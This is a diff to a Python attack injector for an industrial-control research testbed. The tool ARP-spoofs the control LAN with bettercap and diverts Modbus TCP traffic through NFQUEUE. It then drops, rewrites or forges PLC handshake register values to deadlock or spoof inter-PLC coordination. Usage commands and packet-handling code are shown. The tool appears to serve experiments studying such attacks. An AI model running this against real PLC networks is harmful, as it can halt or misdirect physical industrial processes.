@@ -4,31 +4,45 @@ attack_injector.py
 
 MATRIX Testbed — inter-PLC Modbus handshake attack injector (runs on Kali).
 
-THREAT MODEL / POSTURE
-    Posture B: the attacker is on the CONTROL LAN (the engineering-workstation
-    pivot, Stuxnet-style; how the host was compromised is out of scope). All
-    inter-PLC coordination is classic Modbus TCP with the Allen-Bradley Micro820
-    (AB) as the SERVER holding two holding registers; the S7-1200 and TM221 are
-    clients that poll (FC03 read) and write (FC06/FC16) those registers:
+OVERVIEW:
+This is MATRIX inter-PLC Modbus attack injector. It is designed to sit in between the PLC-to-PLC communication links
+and supress, forge or replay specific Modbus Handoff signals between the PLCs.
 
-        reg 0 (400001) — Channel 1 (S7 <-> AB):  S7 writes 1 = "ready";
-                         AB writes 2 = "ack"; both sides act on BLIND network
-                         trust (no sensor cross-check).
-        reg 1 (400002) — Channel 2 (AB <-> TM221): AB writes 1 = "ready";
-                         TM221 writes 2 = "ack". TM221 CROSS-CHECKS a light
-                         barrier before acting on "ready" (sensor-defended).
+The thread model is an attack only in the network layer (doesn't have access to Physcal Plant), and operates in Controller-LAN
+segment o the testbed. (192.168.50.x/24).
 
-    The four signal transitions and how each travels on the wire:
-        T1  S7 "ready"  reg0=1 : S7  -> AB  WRITE  (single packet)   [blind]
-        T2  AB "ack"    reg0=2 : S7 polls AB, reads 2 in FC03 REPLY  [blind]
-        T3  AB "ready"  reg1=1 : TM221 polls AB, reads 1 in FC03 REPLY [DEFENDED]
-        T4  TM221 "ack" reg1=2 : TM221 -> AB WRITE (single packet)    [blind]
+INTER-PLC COMMUNICATION:
 
-MECHANISM (per decisions AGREED for this build)
+Micro820 (Allen-Bradley) acts as the Modbus Server, and S7-1200 and TM221 act as Modbus Clients. 
+The communication is over Modbus TCP (port 502). AB exposes two holding registers (400001 and 400002) referred to as 
+SiemensHandoffCode and SchnienerHandshakeCode respectively. 
+When S7-1200 has a workpiece ready for pick up, is writes SiemensHandoffCode = 1, AB picks the workpiece and 
+writes write SiemensHandoffCode = 2 to acknowledge. Similarly, when AB has a workpiece ready for trasnport, 
+it writes  SchnienerHandshakeCode = 1, TM221 picks the workpiece and writes SchnienerHandshakeCode = 2 to acknowledge.
+
+The stages a re tightly interlocked: S7-1200 will not proceed to the next step if it hasn't recieved acknoledgement from AB,
+and AB will not pick a work piece if it hasn't recieved an acknowledgement from TM221 
+(Even if S7-1200 has written SiemensHandoffCode = 1). 
+
+The S7-1200 and AB are blind-trust channels (no sensor cross-check), but 
+TM221 has a light barrier cross-check before acting on the "ready" signal from AB.
+
+
+
+ In summary, here ar the four signal transitions and how each travels on the wire:
+    T1  S7 "ready"  reg0=1 : S7  -> AB  WRITE  (single packet)   [blind]
+    T2  AB "ack"    reg0=2 : S7 polls AB, reads 2 in FC03 REPLY  [blind]
+    T3  AB "ready"  reg1=1 : TM221 polls AB, reads 1 in FC03 REPLY [DEFENDED]
+    T4  TM221 "ack" reg1=2 : TM221 -> AB WRITE (single packet)    [blind]
+
+        
+MECHANISM (how the attack injector works):
     * write transitions (T1, T4): suppress = DROP the write packet. One dropped
       packet permanently deadlocks that cycle (clients write the signal once,
-      then only poll; no retry). forge/replay (inject a write into the live TCP
-      session) is STRETCH/experimental — see --action.
+      then only poll; no retry). 
+      
+      forge/replay (inject a write into the live TCP session) is STRETCH/experimental — see --action.
+    
     * read-reply transitions (T2, T3): suppress/forge = REWRITE the target
       register's 2 bytes inside AB's FC03 reply, sustained for the window
       (clients poll continuously). Register values are fixed 2-byte fields, so
@@ -42,23 +56,17 @@ PIPELINE
              accept (forward verbatim)  — the default for everything
              drop                        — suppression of a write
              modify+accept               — reply rewrite (suppress/forge)
+    
     Everything is restored on exit (iptables flushed, bettercap stopped so ARP
     is repaired, ip_forward restored) — including on Ctrl-C / crash.
 
-GROUND-TRUTH LOG
+DATA COLLECTION
     results/<run_id>/attack_log.json  — armed/onset/close timestamps + every
-    manipulated packet. Share --run-id with the experiment logger so the pcap
+    manipulated packet. Shares --run-id with the experiment logger so the pcap
     (SPAN), the state log (SQLite) and this attack-log align by run_id + time.
     (Kali and the SCADA PC must be NTP-synced for cross-host timestamp
     alignment.)
 
-STANDARD-TOOL DIVISION (for the paper's methodology)
-    Recon = nmap/Wireshark; on-path = bettercap (recognized ARP-MITM); transport
-    diversion = iptables/NFQUEUE (OS-standard). The ONLY custom part is the thin,
-    register-targeted Modbus manipulation below — because no framework targets
-    THIS testbed's coordination semantics. Attacks are scripted specifically to
-    be precisely timed and bit-identically repeatable, which interactive
-    frameworks do not provide.
 
 USAGE (run as root on Kali)
     # suppress S7's "ready" (T1) — single-packet deadlock, event-triggered:
@@ -73,7 +81,7 @@ USAGE (run as root on Kali)
     sudo python3 attack_injector.py --pair tm221-ab --transition ready \
          --action forge --iface eth1 --hold 30 --run-id s2_forge_ready_defended_0001
 
-    # time-based instead of event-triggered: add --window-trigger <seconds>
+    # For time-based instead of event-triggered: add --window-trigger <seconds>
 
 SAFETY
     ARP-spoofing live PLC coordination is disruptive by nature. Use bounded
@@ -99,14 +107,15 @@ from datetime import datetime, timezone
 from netfilterqueue import NetfilterQueue           # type: ignore
 from scapy.all import IP, TCP, Raw                   # type: ignore
 
-# ==========================================================================
+# -------------------------------------------------------------------
 # CONFIGURATION
-# ==========================================================================
+# ------------------------------------------------------------------- 
+
 AB_IP        = "192.168.50.20"          # Micro820 — the Modbus SERVER
 CLIENT_IP    = {"s7-ab": "192.168.50.10", "tm221-ab": "192.168.50.50"}
 MODBUS_PORT  = 502
 QUEUE_NUM    = 1                         # NFQUEUE number (override with --queue-num)
-RESULTS_DEFAULT = "results"
+RESULTS_DEFAULT = "results" # This the folder where results are kept.
 
 # Per (pair, transition): which register, how the signal travels, its value, and
 # whether the receiver sensor-cross-checks it. Derived — not CLI args.
@@ -128,9 +137,10 @@ FC_WRITE_MULTIPLE = 0x10
 MAX_LOG_EVENTS = 20000          # cap the attack-log event list (counters still exact)
 
 
-# ==========================================================================
+# --------------------------------------------------------------------------
 # RUNTIME STATE (mutated by the packet handler and the main loop)
-# ==========================================================================
+# --------------------------------------------------------------------------
+
 STATE = {
     "window_open": False,
     "finished": False,
@@ -219,7 +229,7 @@ def _handle(packet):
     to_value = CFG["to_value"]
     action   = CFG["action"]
 
-    # ---- Track FC03 read requests so we can locate the register in replies ----
+    # Track FC03 read requests so we can locate the register in replies 
     if to_ab and fc == FC_READ_HOLDING and len(load) >= 12:
         start = u16(load, 8); qty = u16(load, 10)
         PENDING_READS[(tcp.sport, txid)] = (start, qty, time.monotonic())
@@ -227,10 +237,10 @@ def _handle(packet):
         COUNTERS["passed"] += 1
         packet.accept(); return
 
-    # ======================================================================
+    # --------------------------------------------------------------------
     # WRITE-carrier transitions (T1 ready reg0=1, T4 ack reg1=2)
     # suppress = drop the client's write of the signal value.
-    # ======================================================================
+    # --------------------------------------------------------------------
     if carrier == "write" and to_ab and fc in (FC_WRITE_SINGLE, FC_WRITE_MULTIPLE):
         wrote_signal, where = _write_sets_reg_to(load, fc, reg, signal)
         if wrote_signal:
@@ -247,14 +257,15 @@ def _handle(packet):
         COUNTERS["passed"] += 1
         packet.accept(); return
 
-    # ======================================================================
+    # ----------------------------------------------------------------------------------
     # READ-REPLY-carrier transitions (T2 ack reg0=2, T3 ready reg1=1)
     # suppress = rewrite the register to a neutral value (default 0) so the
     #            client never sees the signal.
     # forge    = rewrite the register TO the signal value so the client sees a
     #            signal that was never set (T3 forge should be DEFEATED by the
     #            light barrier — we still perform it; TM221's logic refuses it).
-    # ======================================================================
+    # ------------------------------------------------------------------------------------
+   
     if carrier == "read_reply" and from_ab and fc == FC_READ_HOLDING and len(load) >= 9:
         byte_count = load[8]
         key = (tcp.dport, txid)         # reply's dest port == client's source port
@@ -328,9 +339,10 @@ def _write_sets_reg_to(load, fc, reg, value):
     return (False, None)
 
 
-# ==========================================================================
+# ----------------------------------------------------------------------------
 # WINDOW CONTROL
-# ==========================================================================
+# ----------------------------------------------------------------------------
+
 def _open_window():
     STATE["window_open"] = True
     STATE["open_ts"] = time.monotonic()
@@ -362,9 +374,9 @@ def check_timing(args):
         STATE["finished"] = True
 
 
-# ==========================================================================
+# ----------------------------------------------------------------------------
 # SETUP / TEARDOWN  (iptables, ip_forward, bettercap) — all reversible.
-# ==========================================================================
+# ----------------------------------------------------------------------------
 _IPTABLES_RULES = []            # rules we added, to delete on teardown
 _BETTERCAP = None               # bettercap subprocess handle
 _ORIG_IP_FORWARD = None         # original /proc value, to restore
@@ -430,7 +442,7 @@ def teardown_network():
             pass
 
 
-# ==========================================================================
+# --------------------------------------------------------------------------------
 # ATTACK LOG
 # ==========================================================================
 def write_attack_log(args, client_ip, profile):
